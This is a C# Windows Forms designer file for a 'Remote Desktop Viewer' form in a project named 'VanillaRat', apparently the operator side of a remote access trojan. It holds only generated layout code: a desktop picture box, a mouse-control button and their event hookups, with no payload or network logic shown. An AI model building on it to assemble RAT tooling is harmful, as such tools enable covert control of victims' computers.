using System.Windows.Forms;

namespace VanillaRat.Forms
{
    partial class RDC
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.btnMouse = new System.Windows.Forms.PictureBox();
            this.pbDesktop = new System.Windows.Forms.PictureBox();
            this.RDMenu = new System.Windows.Forms.Panel();
            ((System.ComponentModel.ISupportInitialize)(this.btnMouse)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pbDesktop)).BeginInit();
            this.RDMenu.SuspendLayout();
            this.SuspendLayout();
            // 
            // btnMouse
            // 
            this.btnMouse.BackColor = System.Drawing.Color.Transparent;
            this.btnMouse.Image = global::VanillaRat.Properties.Resources.Mouse_48px;
            this.btnMouse.Location = new System.Drawing.Point(0, 0);
            this.btnMouse.Name = "btnMouse";
            this.btnMouse.Size = new System.Drawing.Size(34, 33);
            this.btnMouse.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.btnMouse.TabIndex = 1;
            this.btnMouse.TabStop = false;
            this.btnMouse.Click += new System.EventHandler(this.btnMouse_Click);
            this.btnMouse.MouseDown += new System.Windows.Forms.MouseEventHandler(this.btnMouse_MouseDown);
            this.btnMouse.MouseUp += new System.Windows.Forms.MouseEventHandler(this.btnMouse_MouseUp);
            // 
            // pbDesktop
            // 
            this.pbDesktop.Dock = System.Windows.Forms.DockStyle.Fill;
            this.pbDesktop.Location = new System.Drawing.Point(0, 0);
            this.pbDesktop.Name = "pbDesktop";
            this.pbDesktop.Size = new System.Drawing.Size(644, 368);
            this.pbDesktop.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pbDesktop.TabIndex = 0;
            this.pbDesktop.TabStop = false;
            this.pbDesktop.MouseClick += new System.Windows.Forms.MouseEventHandler(this.pbDesktop_MouseClick);
            this.pbDesktop.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.pbDesktop_MouseDoubleClick);
            // 
            // RDMenu
            // 
            this.RDMenu.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.RDMenu.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(223)))), ((int)(((byte)(230)))), ((int)(((byte)(233)))));
            this.RDMenu.Controls.Add(this.btnMouse);
            this.RDMenu.Location = new System.Drawing.Point(305, 0);
            this.RDMenu.Name = "RDMenu";
            this.RDMenu.Size = new System.Drawing.Size(34, 33);
            this.RDMenu.TabIndex = 3;
            // 
            // RDC
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(644, 368);
            this.Controls.Add(this.RDMenu);
            this.Controls.Add(this.pbDesktop);
            this.Name = "RDC";
            this.ShowIcon = false;
            this.Text = "Remote Desktop Viewer";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.RDC_FormClosing);
            this.Load += new System.EventHandler(this.RDC_Load);
            ((System.ComponentModel.ISupportInitialize)(this.btnMouse)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pbDesktop)).EndInit();
            this.RDMenu.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        #endregion

        public PictureBox pbDesktop;
        private PictureBox btnMouse;
        private Panel RDMenu;
    }
}